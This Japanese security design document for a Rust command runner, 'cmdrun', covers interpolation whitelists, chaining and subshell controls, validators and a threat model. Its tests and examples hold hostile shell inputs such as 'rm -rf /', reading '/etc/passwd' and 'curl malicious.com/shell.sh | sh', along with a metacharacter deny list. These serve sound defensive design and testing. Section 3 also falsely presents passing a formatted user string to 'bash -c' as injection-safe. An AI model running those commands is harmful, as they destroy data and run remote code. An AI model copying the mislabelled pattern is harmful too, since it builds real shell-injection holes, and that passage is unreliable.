# cmdrun セキュリティ設計書

## セキュリティ原則

1. **eval完全排除**: 動的コード実行を一切使用しない
2. **入力検証**: 全ユーザー入力の厳格な検証
3. **最小権限**: 必要最小限の権限で実行
4. **監査可能**: すべての実行を記録・追跡可能
5. **Fail Secure**: エラー時は安全側に倒す

## 1. eval排除戦略

### Node.js版の問題
```javascript
// ❌ 危険: 任意コード実行可能
eval(`const result = ${userInput}`);

// ❌ 危険: シェルインジェクション
exec(`sh -c "${userInput}"`);
```

### Rust版の安全な実装
```rust
// ✅ 安全: 変数展開のみ、コード実行なし
let interpolated = interpolate_variables(input, &env)?;

// ✅ 安全: シェルコマンドは明示的に構築
let mut cmd = Command::new(shell);
cmd.arg("-c").arg(command);
```

**実装詳細**:
- 正規表現ベースの変数展開（`interpolation.rs`）
- ホワイトリスト方式の変数構文
- シェルエスケープは不要（引数として渡す）

## 2. 変数展開のセキュリティ

### 許可する構文（ホワイトリスト）
```
${VAR}              # 基本展開
${VAR:-default}     # デフォルト値
${VAR:?error}       # 必須変数
${VAR:+value}       # 条件置換
```

### 禁止する構文（ブラックリスト）
```
${VAR/pattern/replacement}  # パターン置換
${VAR%pattern}              # サフィックス削除
${VAR#pattern}              # プレフィックス削除
$(command)                  # コマンド置換
`command`                   # コマンド置換（バッククォート）
```

### 実装による保護
```rust
// 正規表現で厳密に制御
static VAR_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)(:[?+\-])?([^}]*)?\}").unwrap()
});

// マッチしない構文はそのまま（展開しない）
// → コマンド置換等は無効化される
```

## 3. シェルインジェクション対策

### 脆弱な例（Node.js）
```javascript
// ❌ シェルインジェクション可能
exec(`echo ${userInput}`);
// userInput = "; rm -rf /" → 危険
```

### 安全な実装（Rust）
```rust
// ✅ 引数として渡すため安全
let mut cmd = Command::new("bash");
cmd.arg("-c");
cmd.arg(format!("echo {}", user_input));
// user_input に ; があっても解釈されない
```

**追加保護策**:
```rust
// シェル特殊文字のエスケープ（shell-words クレート）
use shell_words::quote;

let safe_arg = quote(user_input);
```

## 4. コマンド連結のセキュリティ設計

### 4.1 設計方針

**デフォルト拒否（Secure by Default）**:
```toml
# デフォルト: コマンド連結（&&, ||, ;）は禁止
[config]
allow_command_chaining = false  # デフォルト値

[commands.example]
cmd = "echo hello && echo world"  # ❌ 拒否される
```

**理由**:
1. **シェルインジェクションリスク**: `&&`, `||`, `;` は任意コマンドの連結を許可し、攻撃ベクトルとなる
2. **外部入力の危険性**: 変数展開と組み合わせると、制御困難な実行パスが生成される
3. **意図しない動作**: 先行コマンドの失敗が後続に影響する複雑な依存関係

### 4.2 階層的制御メカニズム

**3層の優先順位**:
```rust
// 1. コマンド個別設定（最優先）
command.allow_chaining: Option<bool>

// 2. グローバル設定
config.allow_command_chaining: bool

// 3. デフォルト（false）
```

**実装**:
```rust
fn build_validator_for_command(&self, command: &Command) -> CommandValidator {
    // 優先順位: 個別 > グローバル > デフォルト(false)
    let allow_chaining = command.allow_chaining
        .unwrap_or(self.context.allow_command_chaining);

    // コマンド連結を許可する場合、strictモード無効化が必要
    // （[;&|] パターンが危険パターンとして検出されるため）
    let effective_strict = if allow_chaining {
        false
    } else {
        self.context.strict
    };

    let mut validator = if effective_strict {
        CommandValidator::new().allow_variable_expansion()
    } else {
        CommandValidator::new()
            .with_strict_mode(false)
            .allow_variable_expansion()
            .allow_pipe()
            .allow_redirect()
    };

    if allow_chaining {
        validator = validator.allow_chaining();
    }

    validator
}
```

### 4.3 安全な代替方法（推奨）

**コマンド配列による順次実行**:
```toml
# ✅ 推奨: 明示的な配列で安全性を保証
[commands.build-and-deploy]
cmd = [
    "npm run build",
    "npm run deploy"
]
# 各コマンドは独立して検証される
# 先行コマンド失敗時は自動停止
```

**利点**:
- 各コマンドが独立して検証される
- シェルメタ文字の解釈を回避
- 依存関係が明示的
- テストが容易

### 4.4 明示的な許可が必要な場合

**個別コマンドでの許可（条件付き推奨）**:
```toml
[commands.git-diff]
description = "変更を確認"
cmd = "cd /path/to/project && git diff"
allow_chaining = true  # このコマンドのみ許可
```

**使用条件**:
1. コマンドが完全に静的（変数展開なし）
2. 信頼できるパス・コマンドのみ
3. 外部入力を一切含まない

**危険な例**:
```toml
# ❌ 絶対禁止: 変数展開とコマンド連結の組み合わせ
[commands.deploy]
cmd = "cd ${DIR} && rm -rf *"  # シェルインジェクションリスク
allow_chaining = true
```

### 4.5 グローバル許可（非推奨）

```toml
# ⚠️ 非推奨: 全コマンドでコマンド連結を許可
[config]
allow_command_chaining = true
```

**リスク**:
- すべてのコマンドで `&&`, `||`, `;` が使用可能になる
- 将来追加されるコマンドも自動的に許可される
- コマンドごとの安全性評価が困難

**許可する場合の条件**:
- すべてのコマンドが信頼できる静的コマンドのみ
- 外部入力を一切含まない環境
- レガシーシェルスクリプトからの移行期間のみ

### 4.6 セキュリティテスト

**階層的制御の検証**:
```rust
#[tokio::test]
async fn test_command_chaining_hierarchical_control() {
    // 1. デフォルト拒否
    let ctx_default = ExecutionContext {
        allow_command_chaining: false,
        ..Default::default()
    };
    let cmd_default = Command {
        cmd: CommandSpec::Single("echo hello && echo world".to_string()),
        allow_chaining: None,  // グローバル設定に従う
        ..
    };
    assert!(executor.execute(&cmd_default).await.is_err());

    // 2. 個別許可（グローバル拒否を上書き）
    let cmd_individual = Command {
        allow_chaining: Some(true),  // 個別で許可
        ..
    };
    assert!(executor.execute(&cmd_individual).await.is_ok());

    // 3. 個別拒否（グローバル許可を上書き）
    let ctx_global_allow = ExecutionContext {
        allow_command_chaining: true,
        ..
    };
    let cmd_deny = Command {
        allow_chaining: Some(false),  // 個別で拒否
        ..
    };
    assert!(executor.execute(&cmd_deny).await.is_err());
}
```

**インジェクション攻撃の防御確認**:
```rust
#[test]
fn test_command_injection_with_chaining() {
    let validator = CommandValidator::new();  // デフォルト: allow_chaining = false

    let dangerous_commands = vec![
        "ls; rm -rf /",
        "echo hello && cat /etc/passwd",
        "whoami || curl malicious.com/shell.sh | sh",
    ];

    for cmd in dangerous_commands {
        assert!(!validator.validate(cmd).is_safe());
    }
}
```

### 4.7 ユーザーガイダンス

**コマンド連結が拒否された場合のヒント**:
```rust
// i18n対応エラーメッセージ
if let ValidationError::DangerousMetacharacters(chars) = err {
    if chars.contains("'&'") || chars.contains("'|'") || chars.contains("';'") {
        eprintln!("{}", get_message(MessageKey::HintCommandChainingAlternatives, language));
        eprintln!("{}", get_message(MessageKey::HintCommandArrayRecommended, language));
        eprintln!("{}", get_message(MessageKey::HintEnableChainingForCommand, language));
        eprintln!("{}", get_message(MessageKey::HintEnableChainingGlobally, language));
    }
}
```

**出力例（日本語）**:
```
💡 ヒント: 次のいずれかの代替方法を使用してください：
   1. コマンド配列を使用（セキュリティ上推奨）:
      cmd = ["cd /path", "git diff"]

   2. このコマンドのみ連結を許可（注意して使用）:
      allow_chaining = true

   3. グローバルで連結を許可（非推奨）:
      [config]
      allow_command_chaining = true
```

### 4.8 ベストプラクティス

1. **コマンド配列を優先**: 可能な限り `cmd = ["cmd1", "cmd2"]` を使用
2. **静的コマンドのみ**: 変数展開とコマンド連結を同時に使用しない
3. **最小権限**: 必要なコマンドのみ個別に `allow_chaining = true` を設定
4. **定期レビュー**: allow_chaining 使用箇所を定期的に監査
5. **テスト**: 各コマンドで期待通りの動作を確認

### 4.9 サブシェル制御（Phase 4拡張）

**デフォルト拒否（Secure by Default）**:
```toml
# デフォルト: サブシェル（括弧）は禁止
[config]
allow_subshells = false  # デフォルト値

[commands.grep-pattern]
cmd = "grep -E '(ERROR|WARN)' app.log"  # ❌ 拒否される（括弧が禁止）
```

**設計根拠**:
1. **セキュリティリスク**: サブシェル `()` は任意のコマンドグループ化を許可し、攻撃ベクトルとなる
2. **正当な用途の限定**: grep正規表現パターン等、特定のユースケースでのみ必要
3. **細粒度制御**: コマンド個別設定により、必要な箇所のみ許可

**階層的制御メカニズム**:
```rust
// 優先順位: 個別 > グローバル > デフォルト(false)
let allow_subshells = command.allow_subshells
    .unwrap_or(self.context.allow_subshells);

// サブシェル許可時はstrictモード無効化
let effective_strict = if allow_chaining || allow_subshells {
    false
} else {
    self.context.strict
};

if allow_subshells {
    validator = validator.allow_subshells();
}
```

**正当な使用例**:

1. **grep正規表現パターン**:
   ```toml
   [commands.search-logs]
   cmd = "grep -E '(ERROR|WARN|FATAL)' /var/log/app.log"
   allow_subshells = true  # 正規表現パターンに括弧が必要
   ```

2. **コマンドグループ化**:
   ```toml
   [commands.build-in-temp]
   cmd = "(cd /tmp && make) && echo Done"
   allow_subshells = true  # サブシェル内で作業ディレクトリ変更
   allow_chaining = true    # && も併用
   ```

**安全な代替方法（推奨）**:
```toml
# ✅ 推奨: コマンド配列で括弧を回避
[commands.search-pattern]
cmd = ["grep", "-E", "(ERROR|WARN)", "app.log"]
# 配列形式では括弧がシェルメタ文字として解釈されない
```

**セキュリティガイドライン**:
1. **正規表現パターンのみ**: grep等の正当な用途に限定
2. **静的パターン**: 変数展開とサブシェルを同時に使用しない
3. **最小権限**: 必要なコマンドのみ個別に `allow_subshells = true` を設定
4. **監査**: allow_subshells 使用箇所を定期的にレビュー

**エスケープシーケンスの許可**:
```rust
// Phase 4で改善: \n, \r, \t はセキュリティリスクがほぼゼロのため許可
const DANGEROUS_METACHARACTERS: &'static [char] = &[
    ';', '&', '|', '>', '<', '`', '$', '(', ')', '{', '}', '[', ']', '\\', '"', '\'',
    // \n, \r, \t は除外（フォーマット出力に必要）
];
```

**利点**:
- フォーマット出力（`echo -e 'line1\nline2'`）が可能に
- セキュリティリスクなし（文字列リテラル内でのみ使用）

## 5. 設定ファイルの検証

### TOML パース時の検証
```rust
use serde::Deserialize;

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]  // 未知フィールドでエラー
pub struct CommandsConfig {
    #[serde(default)]
    pub commands: HashMap<String, Command>,
}

// カスタム検証
impl CommandsConfig {
    pub fn validate(&self) -> Result<()> {
        // 循環依存チェック
        self.check_circular_deps()?;

        // コマンド文字列の妥当性チェック
        for (name, cmd) in &self.commands {
            cmd.validate(name)?;
        }

        Ok(())
    }
}
```

### 循環依存検出
```rust
fn check_circular_deps(&self) -> Result<()> {
    let mut visited = HashSet::new();
    let mut rec_stack = HashSet::new();

    for cmd_name in self.commands.keys() {
        if self.has_cycle(cmd_name, &mut visited, &mut rec_stack)? {
            return Err(ConfigError::CircularDependency(
                cmd_name.clone()
            ).into());
        }
    }
    Ok(())
}
```

## 5. 機密情報の保護

### 環境変数の安全な取り扱い
```rust
use secrecy::{Secret, ExposeSecret};

// 機密情報をSecretでラップ
let api_key = Secret::new(env::var("API_KEY")?);

// 使用時のみ公開
let client = ApiClient::new(api_key.expose_secret());

// ログには出力されない
println!("Key: {:?}", api_key);  // "Secret([REDACTED])"
```

### パスワード等のマスク
```rust
// 環境変数名のパターンマッチ
fn is_sensitive(key: &str) -> bool {
    let sensitive_patterns = [
        "PASSWORD", "SECRET", "TOKEN", "KEY", "CREDENTIAL"
    ];

    sensitive_patterns.iter().any(|p| key.contains(p))
}

// ログ出力時にマスク
fn log_env(key: &str, value: &str) {
    if is_sensitive(key) {
        println!("{}=***", key);
    } else {
        println!("{}={}", key, value);
    }
}
```

## 6. ファイルシステムアクセス制御

### 作業ディレクトリの検証
```rust
use std::path::{Path, PathBuf};

fn validate_working_dir(path: &Path) -> Result<PathBuf> {
    // 絶対パス化
    let abs_path = path.canonicalize()
        .map_err(|_| ConfigError::InvalidWorkingDir)?;

    // シンボリックリンク攻撃対策
    if abs_path.is_symlink() {
        return Err(SecurityError::SymlinkNotAllowed.into());
    }

    // ディレクトリトラバーサル対策
    let current_dir = env::current_dir()?;
    if !abs_path.starts_with(&current_dir) {
        return Err(SecurityError::DirectoryTraversal.into());
    }

    Ok(abs_path)
}
```

### ファイル読み込みの制限
```rust
// 設定ファイルサイズ上限（DoS対策）
const MAX_CONFIG_SIZE: u64 = 10 * 1024 * 1024;  // 10MB

fn read_config_file(path: &Path) -> Result<String> {
    let metadata = fs::metadata(path)?;

    if metadata.len() > MAX_CONFIG_SIZE {
        return Err(SecurityError::ConfigTooLarge.into());
    }

    fs::read_to_string(path)
}
```

## 7. プロセス実行の安全性

### タイムアウト（DoS対策）
```rust
use tokio::time::timeout;

// 必ずタイムアウトを設定
let timeout_duration = Duration::from_secs(config.timeout.unwrap_or(300));

match timeout(timeout_duration, child.wait()).await {
    Ok(status) => status,
    Err(_) => {
        child.kill().await?;
        return Err(ExecutionError::Timeout);
    }
}
```

### リソース制限
```rust
// Unix系: rlimit でリソース制限
#[cfg(unix)]
fn set_resource_limits(cmd: &mut Command) {
    use std::os::unix::process::CommandExt;

    unsafe {
        cmd.pre_exec(|| {
            // CPU時間制限
            libc::setrlimit(libc::RLIMIT_CPU, &libc::rlimit {
                rlim_cur: 300,  // 300秒
                rlim_max: 300,
            });

            // メモリ制限
            libc::setrlimit(libc::RLIMIT_AS, &libc::rlimit {
                rlim_cur: 1024 * 1024 * 1024,  // 1GB
                rlim_max: 1024 * 1024 * 1024,
            });

            Ok(())
        });
    }
}
```

## 8. 監査ログ

### 実行ログの記録
```rust
use tracing::{info, warn, error};

// コマンド実行前
info!(
    command = %cmd_name,
    user = %current_user,
    working_dir = %working_dir,
    "Executing command"
);

// 実行結果
info!(
    command = %cmd_name,
    exit_code = %result.exit_code,
    duration_ms = %result.duration.as_millis(),
    "Command completed"
);

// エラー時
error!(
    command = %cmd_name,
    error = %err,
    "Command failed"
);
```

### 構造化ログ（JSON出力）
```rust
use tracing_subscriber::fmt::format::FmtSpan;

tracing_subscriber::fmt()
    .json()
    .with_span_events(FmtSpan::FULL)
    .with_current_span(false)
    .init();
```

**出力例**:
```json
{
  "timestamp": "2025-11-05T10:30:00Z",
  "level": "INFO",
  "message": "Executing command",
  "command": "build",
  "user": "alice",
  "working_dir": "/home/alice/project"
}
```

## 9. 依存関係のセキュリティ

### cargo-audit による脆弱性検出
```bash
# CI/CDに組み込み
cargo audit

# 自動修正
cargo audit fix
```

### cargo-deny による依存関係管理
```toml
# deny.toml
[advisories]
vulnerability = "deny"
unmaintained = "warn"
unsound = "warn"

[licenses]
unlicensed = "deny"
allow = ["MIT", "Apache-2.0", "BSD-3-Clause"]
```

```bash
# ライセンス・脆弱性チェック
cargo deny check
```

## 10. セキュリティチェックリスト

### 設計時
- [ ] eval/動的コード実行を使用しない
- [ ] 入力検証を実装
- [ ] 最小権限の原則を適用
- [ ] タイムアウトを設定
- [ ] エラー処理を適切に実装

### 実装時
- [ ] 変数展開はホワイトリスト方式
- [ ] シェルインジェクション対策
- [ ] コマンド連結はデフォルト拒否（allow_chaining）
- [ ] allow_chaining使用時は静的コマンドのみ
- [ ] 変数展開とコマンド連結を同時使用しない
- [ ] ディレクトリトラバーサル対策
- [ ] 機密情報のマスク
- [ ] リソース制限の実装

### テスト時
- [ ] 悪意ある入力でのテスト
- [ ] コマンド連結の階層的制御テスト
- [ ] allow_chaining によるインジェクション対策テスト
- [ ] 循環依存の検出テスト
- [ ] タイムアウトのテスト
- [ ] 権限エスカレーションのテスト

### 運用時
- [ ] 監査ログの有効化
- [ ] 定期的な依存関係の更新
- [ ] cargo-audit の実行
- [ ] セキュリティアドバイザリの確認

## 11. 脅威モデル

### 想定される脅威

1. **悪意ある設定ファイル**
   - 対策: TOML パース時の厳格な検証
   - 対策: 循環依存の検出

2. **シェルインジェクション**
   - 対策: 引数として渡す（シェル解釈を回避）
   - 対策: shell-words でエスケープ
   - 対策: コマンド連結（&&, ||, ;）をデフォルト拒否

2-1. **コマンド連結による攻撃**
   - 脅威: `cmd = "cd ${USER_DIR} && rm -rf *"` のような変数展開とコマンド連結の組み合わせ
   - 影響: USER_DIR に `/; echo malicious` を設定すると任意コマンド実行が可能
   - 対策: デフォルトで &&, ||, ; を禁止（allow_chaining = false）
   - 対策: 個別コマンドでの明示的な許可が必要
   - 対策: 安全な代替としてコマンド配列 `cmd = ["cmd1", "cmd2"]` を推奨
   - 対策: allow_chaining使用時は静的コマンドのみ許可

3. **ディレクトリトラバーサル**
   - 対策: 絶対パス化と検証
   - 対策: 親ディレクトリへのアクセス制限

4. **DoS攻撃（リソース枯渇）**
   - 対策: タイムアウトの強制
   - 対策: リソース制限（rlimit）
   - 対策: 設定ファイルサイズ上限

5. **機密情報の漏洩**
   - 対策: secrecy クレートで保護
   - 対策: ログ出力時のマスク

## 12. セキュアコーディングガイドライン

### Rustのメモリ安全性を活用
```rust
// ✅ コンパイラが保証
// - Use-after-free なし
// - バッファオーバーフローなし
// - データ競合なし
```

### unsafeコードの最小化
```rust
// unsafeは必要最小限に
#[cfg(unix)]
unsafe {
    // リソース制限設定のみ
    libc::setrlimit(...);
}

// 安全性不変条件を文書化
/// # Safety
/// This function must only be called after fork()
unsafe fn set_limits() { ... }
```

### エラーハンドリングの徹底
```rust
// Result型を活用
fn execute_command(cmd: &str) -> Result<ExecutionResult> {
    // エラーは必ず処理
}

// パニックは回避
let value = map.get(key).ok_or(ConfigError::KeyNotFound)?;
```
